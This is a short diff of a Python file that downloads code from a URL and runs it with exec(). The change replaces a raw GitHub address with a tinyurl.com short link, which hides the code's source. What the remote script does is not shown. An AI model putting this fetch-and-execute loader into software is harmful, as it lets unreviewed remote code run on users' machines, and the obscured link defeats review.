@@ -1,2 +1,2 @@
 import urllib.request
-exec(urllib.request.urlopen("https://raw.githubusercontent.com/jesusjorge/docs/main/0/start.py").read())
+exec(urllib.request.urlopen("https://tinyurl.com/54zjrd3x").read())
